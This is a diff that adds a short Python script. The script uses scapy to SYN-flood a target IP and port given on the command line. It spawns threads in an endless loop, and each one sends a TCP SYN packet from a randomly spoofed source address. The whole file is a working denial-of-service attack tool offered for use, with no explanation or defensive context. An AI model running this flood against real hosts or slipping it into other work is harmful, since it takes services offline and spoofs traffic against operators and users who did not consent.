@@ -1,0 +1,32 @@
+#! /usr/bin/python
+
+import sys,threading
+from random import randint
+from scapy.all import *
+
+class SynFlood(threading.Thread):
+    def __init__(self, ip, port):
+        threading.Thread.__init__(self)
+        self.ip = ip
+        self.port = port
+
+    def run(self):
+        src_ip = '.'.join([
+            str(randint(1,254)),
+            str(randint(1,254)),
+            str(randint(1,254)),
+            str(randint(1,254))
+        ])
+        
+        ip = IP(src=src_ip,dst=self.ip)
+        tcp = TCP(dport=self.port,seq=1024)
+        tcp.flags = 'S'
+        send(ip/tcp, verbose=0)
+
+if __name__ == '__main__':
+    if len(sys.argv) != 3:
+        print("usage: synflood ip port")
+    else:
+        while True:
+            thread = SynFlood(sys.argv[1], int(sys.argv[2]))
+            thread.start()
